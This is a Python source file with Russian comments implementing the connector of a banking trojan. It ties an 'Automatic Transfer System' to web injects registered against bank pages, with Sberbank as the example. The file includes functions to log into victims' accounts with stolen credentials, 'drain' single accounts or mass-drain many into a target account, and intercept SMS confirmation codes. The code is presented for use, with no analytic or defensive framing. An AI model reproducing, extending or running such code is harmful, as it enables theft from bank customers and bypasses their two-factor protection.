#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ATS Bank Connector Module

Предоставляет интерфейс для связи между модулем ATS (Automatic Transfer System) 
и модулем банковских инжектов для автоматизации банковских операций.
"""

import os
import json
import logging
import importlib.util
import traceback
from typing import Dict, List, Any, Optional, Tuple, Union

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('ats_bank_connector.log')
    ]
)

logger = logging.getLogger('ats_bank_connector')

# Проверка наличия необходимых модулей
try:
    # Пытаемся импортировать модуль ATS
    if importlib.util.find_spec("agent_modules.ats_module"):
        from agent_modules.ats_module import AutomaticTransferSystem, ATSConfig, WebInject, SMSInterceptor
        ats_module_available = True
    else:
        logger.warning("Модуль ATS не найден")
        ats_module_available = False

    # Пытаемся импортировать модуль банковских инжектов
    if importlib.util.find_spec("agent_modules.bank_integration"):
        from agent_modules.bank_integration import BankInjectBase, get_bank_inject, register_bank_inject, get_available_bank_injects
        bank_integration_available = True
    else:
        logger.warning("Модуль банковских инжектов не найден")
        bank_integration_available = False

except ImportError as e:
    logger.error(f"Ошибка импорта: {str(e)}")
    ats_module_available = False
    bank_integration_available = False

class ATSBankConnector:
    """
    Класс для связи между ATS и модулем банковских инжектов
    """
    
    def __init__(self):
        """
        Инициализация коннектора
        """
        self.ats_instance = None
        self.bank_injects = {}
        
        # Проверяем доступность модулей
        self.ats_available = ats_module_available
        self.bank_integration_available = bank_integration_available
        
        if not self.ats_available:
            logger.error("Модуль ATS недоступен. Коннектор будет работать с ограниченной функциональностью.")
        
        if not self.bank_integration_available:
            logger.error("Модуль банковских инжектов недоступен. Коннектор будет работать с ограниченной функциональностью.")
        
        # Если оба модуля доступны, инициализируем их
        if self.ats_available and self.bank_integration_available:
            self._initialize()
    
    def _initialize(self):
        """
        Инициализация модулей и загрузка доступных инжектов
        """
        try:
            # Создаем конфигурацию ATS
            ats_config = ATSConfig()
            ats_config.load()
            
            # Создаем экземпляр ATS
            self.ats_instance = AutomaticTransferSystem(ats_config)
            
            # Загружаем доступные банковские инжекты
            self._load_bank_injects()
            
            logger.info("ATSBankConnector успешно инициализирован")
        except Exception as e:
            logger.error(f"Ошибка инициализации ATSBankConnector: {str(e)}")
            traceback.print_exc()
    
    def _load_bank_injects(self):
        """
        Загрузка доступных банковских инжектов
        """
        try:
            # Получаем список доступных банковских инжектов
            available_banks = get_available_bank_injects()
            
            # Загружаем каждый инжект
            for bank_type in available_banks:
                bank_inject = get_bank_inject(bank_type)
                if bank_inject:
                    self.bank_injects[bank_type] = bank_inject
                    logger.info(f"Загружен инжект для банка {bank_inject.name} ({bank_type})")
            
            logger.info(f"Загружено {len(self.bank_injects)} банковских инжектов")
        except Exception as e:
            logger.error(f"Ошибка загрузки банковских инжектов: {str(e)}")
            traceback.print_exc()
    
    def get_available_banks(self) -> List[Dict[str, Any]]:
        """
        Получение списка доступных банков
        
        Returns:
            List[Dict[str, Any]]: Список доступных банков с их параметрами
        """
        if not self.bank_integration_available:
            logger.error("Модуль банковских инжектов недоступен")
            return []
        
        try:
            return [
                {
                    "bank_type": bank_type,
                    "name": inject.name,
                    "description": inject.description,
                    "version": inject.version,
                    "inject_count": len(inject.injects)
                }
                for bank_type, inject in self.bank_injects.items()
            ]
        except Exception as e:
            logger.error(f"Ошибка получения списка доступных банков: {str(e)}")
            return []
    
    def get_bank_inject_details(self, bank_type: str) -> Optional[Dict[str, Any]]:
        """
        Получение детальной информации о инжекте для конкретного банка
        
        Args:
            bank_type: Тип банка
            
        Returns:
            Optional[Dict[str, Any]]: Информация об инжекте или None, если инжект не найден
        """
        if not self.bank_integration_available:
            logger.error("Модуль банковских инжектов недоступен")
            return None
        
        try:
            if bank_type in self.bank_injects:
                inject = self.bank_injects[bank_type]
                return inject.to_dict()
            
            # Если инжект не загружен, пытаемся загрузить его
            inject = get_bank_inject(bank_type)
            if inject:
                self.bank_injects[bank_type] = inject
                return inject.to_dict()
            
            logger.warning(f"Инжект для банка {bank_type} не найден")
            return None
        except Exception as e:
            logger.error(f"Ошибка получения информации об инжекте для банка {bank_type}: {str(e)}")
            return None
    
    def register_webinject_to_ats(self, bank_type: str, url_pattern: str = None) -> bool:
        """
        Регистрация веб-инжекта в ATS
        
        Args:
            bank_type: Тип банка
            url_pattern: Паттерн URL для конкретного инжекта (опционально)
            
        Returns:
            bool: True если регистрация успешна, иначе False
        """
        if not self.ats_available or not self.bank_integration_available:
            logger.error("Один из модулей (ATS или банковских инжектов) недоступен")
            return False
        
        try:
            # Получаем инжект для указанного банка
            inject = self.get_bank_inject_details(bank_type)
            if not inject:
                logger.warning(f"Инжект для банка {bank_type} не найден")
                return False
            
            # Создаем WebInject для ATS
            injects_data = inject.get("injects", [])
            
            # Если указан конкретный шаблон URL, регистрируем только его
            if url_pattern:
                for inject_data in injects_data:
                    if inject_data.get("url_pattern") == url_pattern:
                        web_inject = WebInject(
                            url_pattern=inject_data.get("url_pattern"),
                            scripts=inject_data.get("scripts", []),
                            styles=inject_data.get("styles", []),
                            elements=inject_data.get("elements", [])
                        )
                        self.ats_instance.register_webinject(web_inject)
                        logger.info(f"Зарегистрирован инжект для URL {url_pattern} в ATS")
                        return True
                
                logger.warning(f"Инжект для URL {url_pattern} в банке {bank_type} не найден")
                return False
            
            # Если не указан конкретный шаблон URL, регистрируем все инжекты
            for inject_data in injects_data:
                web_inject = WebInject(
                    url_pattern=inject_data.get("url_pattern"),
                    scripts=inject_data.get("scripts", []),
                    styles=inject_data.get("styles", []),
                    elements=inject_data.get("elements", [])
                )
                self.ats_instance.register_webinject(web_inject)
            
            logger.info(f"Зарегистрировано {len(injects_data)} инжектов для банка {bank_type} в ATS")
            return True
        except Exception as e:
            logger.error(f"Ошибка регистрации инжекта в ATS: {str(e)}")
            traceback.print_exc()
            return False
    
    def login_to_bank(self, bank_type: str, credentials: Dict[str, str]) -> Dict[str, Any]:
        """
        Вход в банковский аккаунт через ATS
        
        Args:
            bank_type: Тип банка
            credentials: Данные для входа (логин, пароль и т.д.)
            
        Returns:
            Dict[str, Any]: Результат операции
        """
        if not self.ats_available:
            logger.error("Модуль ATS недоступен")
            return {"success": False, "error": "Модуль ATS недоступен"}
        
        try:
            # Проверяем, зарегистрирован ли инжект для этого банка
            if bank_type not in self.bank_injects:
                # Если нет, регистрируем его
                if not self.register_webinject_to_ats(bank_type):
                    return {"success": False, "error": f"Ошибка регистрации инжекта для банка {bank_type}"}
            
            # Вызываем метод входа в ATS
            result = self.ats_instance.login(bank_type, credentials)
            logger.info(f"Результат входа в банк {bank_type}: {result}")
            return result
        except Exception as e:
            error_msg = f"Ошибка входа в банк {bank_type}: {str(e)}"
            logger.error(error_msg)
            traceback.print_exc()
            return {"success": False, "error": error_msg}
    
    def drain_account(self, bank_type: str, account_info: Dict[str, Any], target_account: str, amount: float = None) -> Dict[str, Any]:
        """
        Вывод средств с банковского счета
        
        Args:
            bank_type: Тип банка
            account_info: Информация о счете
            target_account: Счет получателя
            amount: Сумма для вывода (опционально, если не указано - весь баланс)
            
        Returns:
            Dict[str, Any]: Результат операции
        """
        if not self.ats_available:
            logger.error("Модуль ATS недоступен")
            return {"success": False, "error": "Модуль ATS недоступен"}
        
        try:
            # Проверяем, зарегистрирован ли инжект для этого банка
            if bank_type not in self.bank_injects:
                # Если нет, регистрируем его
                if not self.register_webinject_to_ats(bank_type):
                    return {"success": False, "error": f"Ошибка регистрации инжекта для банка {bank_type}"}
            
            # Вызываем метод вывода средств в ATS
            result = self.ats_instance.drain(
                bank_type=bank_type,
                account_info=account_info,
                target_account=target_account,
                amount=amount
            )
            logger.info(f"Результат вывода средств из банка {bank_type}: {result}")
            return result
        except Exception as e:
            error_msg = f"Ошибка вывода средств из банка {bank_type}: {str(e)}"
            logger.error(error_msg)
            traceback.print_exc()
            return {"success": False, "error": error_msg}
    
    def mass_drain(self, bank_type: str, accounts: List[Dict[str, Any]], target_account: str) -> Dict[str, Any]:
        """
        Массовый вывод средств с нескольких банковских счетов
        
        Args:
            bank_type: Тип банка
            accounts: Список аккаунтов для вывода
            target_account: Счет получателя
            
        Returns:
            Dict[str, Any]: Результат операции
        """
        if not self.ats_available:
            logger.error("Модуль ATS недоступен")
            return {"success": False, "error": "Модуль ATS недоступен", "results": []}
        
        try:
            # Проверяем, зарегистрирован ли инжект для этого банка
            if bank_type not in self.bank_injects:
                # Если нет, регистрируем его
                if not self.register_webinject_to_ats(bank_type):
                    return {"success": False, "error": f"Ошибка регистрации инжекта для банка {bank_type}", "results": []}
            
            # Вызываем метод массового вывода средств в ATS
            result = self.ats_instance.mass_drain(
                bank_type=bank_type,
                accounts=accounts,
                target_account=target_account
            )
            
            logger.info(f"Результат массового вывода средств из банка {bank_type}: {result}")
            return result
        except Exception as e:
            error_msg = f"Ошибка массового вывода средств из банка {bank_type}: {str(e)}"
            logger.error(error_msg)
            traceback.print_exc()
            return {"success": False, "error": error_msg, "results": []}
    
    def intercept_sms(self, phone_number: str, timeout: int = 60) -> Dict[str, Any]:
        """
        Перехват SMS-кода
        
        Args:
            phone_number: Номер телефона
            timeout: Таймаут в секундах
            
        Returns:
            Dict[str, Any]: Результат операции
        """
        if not self.ats_available:
            logger.error("Модуль ATS недоступен")
            return {"success": False, "error": "Модуль ATS недоступен"}
        
        try:
            # Вызываем метод перехвата SMS в ATS
            result = self.ats_instance.intercept_sms(phone_number, timeout)
            logger.info(f"Результат перехвата SMS для номера {phone_number}: {result}")
            return result
        except Exception as e:
            error_msg = f"Ошибка перехвата SMS для номера {phone_number}: {str(e)}"
            logger.error(error_msg)
            traceback.print_exc()
            return {"success": False, "error": error_msg}
    
    def add_bank_inject(self, bank_type: str, url_pattern: str, description: str, 
                      scripts: List[Dict[str, str]] = None, styles: List[str] = None,
                      elements: List[Dict[str, str]] = None) -> Dict[str, Any]:
        """
        Добавление нового банковского инжекта
        
        Args:
            bank_type: Тип банка
            url_pattern: Паттерн URL
            description: Описание инжекта
            scripts: Список скриптов
            styles: Список стилей
            elements: Список элементов для замены
            
        Returns:
            Dict[str, Any]: Результат операции
        """
        if not self.bank_integration_available:
            logger.error("Модуль банковских инжектов недоступен")
            return {"success": False, "error": "Модуль банковских инжектов недоступен"}
        
        try:
            # Получаем инжект для указанного банка или создаем новый
            if bank_type in self.bank_injects:
                inject = self.bank_injects[bank_type]
            else:
                inject = get_bank_inject(bank_type)
                if not inject:
                    # Создаем новый базовый инжект
                    from agent_modules.bank_integration import BankInjectBase
                    inject = BankInjectBase(bank_type)
                    self.bank_injects[bank_type] = inject
            
            # Добавляем инжект
            success = inject.add_inject(
                url_pattern=url_pattern,
                description=description,
                scripts=scripts,
                styles=styles,
                elements=elements
            )
            
            if success:
                # Сохраняем инжект в файл
                inject.save_to_file()
                
                # Регистрируем инжект в ATS, если он доступен
                if self.ats_available:
                    web_inject = WebInject(
                        url_pattern=url_pattern,
                        scripts=scripts or [],
                        styles=styles or [],
                        elements=elements or []
                    )
                    self.ats_instance.register_webinject(web_inject)
                
                logger.info(f"Добавлен инжект для URL {url_pattern} в банк {bank_type}")
                return {"success": True, "message": f"Инжект для URL {url_pattern} добавлен"}
            else:
                return {"success": False, "error": f"Ошибка добавления инжекта для URL {url_pattern}"}
        except Exception as e:
            error_msg = f"Ошибка добавления инжекта для банка {bank_type}: {str(e)}"
            logger.error(error_msg)
            traceback.print_exc()
            return {"success": False, "error": error_msg}
    
    def remove_bank_inject(self, bank_type: str, url_pattern: str) -> Dict[str, Any]:
        """
        Удаление банковского инжекта
        
        Args:
            bank_type: Тип банка
            url_pattern: Паттерн URL
            
        Returns:
            Dict[str, Any]: Результат операции
        """
        if not self.bank_integration_available:
            logger.error("Модуль банковских инжектов недоступен")
            return {"success": False, "error": "Модуль банковских инжектов недоступен"}
        
        try:
            # Получаем инжект для указанного банка
            if bank_type not in self.bank_injects:
                inject = get_bank_inject(bank_type)
                if not inject:
                    return {"success": False, "error": f"Инжект для банка {bank_type} не найден"}
                self.bank_injects[bank_type] = inject
            else:
                inject = self.bank_injects[bank_type]
            
            # Удаляем инжект
            success = inject.remove_inject(url_pattern)
            
            if success:
                # Сохраняем инжект в файл
                inject.save_to_file()
                
                logger.info(f"Удален инжект для URL {url_pattern} из банка {bank_type}")
                return {"success": True, "message": f"Инжект для URL {url_pattern} удален"}
            else:
                return {"success": False, "error": f"Инжект для URL {url_pattern} не найден"}
        except Exception as e:
            error_msg = f"Ошибка удаления инжекта для банка {bank_type}: {str(e)}"
            logger.error(error_msg)
            traceback.print_exc()
            return {"success": False, "error": error_msg}
    
    def get_ats_results(self) -> Dict[str, Any]:
        """
        Получение результатов операций ATS
        
        Returns:
            Dict[str, Any]: Результаты операций
        """
        if not self.ats_available:
            logger.error("Модуль ATS недоступен")
            return {"success": False, "error": "Модуль ATS недоступен", "results": []}
        
        try:
            results = self.ats_instance.get_results()
            return {"success": True, "results": results}
        except Exception as e:
            error_msg = f"Ошибка получения результатов операций ATS: {str(e)}"
            logger.error(error_msg)
            traceback.print_exc()
            return {"success": False, "error": error_msg, "results": []}

# Единый экземпляр коннектора
_connector_instance = None

def get_connector() -> ATSBankConnector:
    """
    Получение экземпляра коннектора
    
    Returns:
        ATSBankConnector: Экземпляр коннектора
    """
    global _connector_instance
    if _connector_instance is None:
        _connector_instance = ATSBankConnector()
    return _connector_instance

# Пример использования
if __name__ == "__main__":
    # Получаем экземпляр коннектора
    connector = get_connector()
    
    # Получаем список доступных банков
    available_banks = connector.get_available_banks()
    print(f"Доступные банки: {json.dumps(available_banks, indent=2)}")
    
    # Для примера, если доступен Сбербанк, регистрируем его инжекты в ATS
    for bank in available_banks:
        if bank["bank_type"] == "sberbank":
            connector.register_webinject_to_ats("sberbank")
            break 